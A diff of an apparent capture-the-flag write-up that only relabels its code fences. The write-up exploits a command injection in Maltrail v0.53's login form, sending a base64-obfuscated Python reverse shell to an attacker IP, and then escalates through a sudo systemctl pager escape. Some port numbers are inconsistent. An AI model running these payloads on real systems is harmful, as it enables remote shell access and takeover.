@@ -86,33 +86,33 @@ So we basically have an OS Command Injection on the web server. Let’s find out
 
 First of all, let’s start a nc listenner on port 1700:
 
-```
+```text
 nc -nlvp 1700
 listening on [any] 8000 ...
 ```
 
 According to the p[revious article ](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/), this version of Maltrail(v0.53) is vulnerable to OS command injection. We can inject arbitrary OS commands into the username parameter!
 
-```
+```text
 curl 'http://10.10.11.224:5555/pl64v6v/login' \
   --data 'username=;`<THE_COMMAND>'
 ```
 
 We will use a python reverseshell because Maltrail is written in python, so we are sure that python is installed on the target machine.
 
-```
+```text
 export RHOST="10.10.16.3";export RPORT=1700;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
 ```
 
 Let’s encode it to base64 to avoid any protection:
 
-```
+```text
 cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjMiLDE3MDApKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJiYXNoIikn
 ```
 
 Then let’s craft our little payload:
 
-```
+```text
 curl 'http://10.10.11.224:55555/9i68dk6' --data 'username=;echo+"cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjMiLDE3MDApKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJiYXNoIikn"+|+base64+-d+|+bash'
 ```
 
@@ -138,7 +138,7 @@ Interesting…we can run* **/usr/bin/systemctl status trail.service*** with sudo
 
 We run this:
 
-```
+```text
 sudo  /usr/bin/systemctl status trail.service
 !sh
 ```
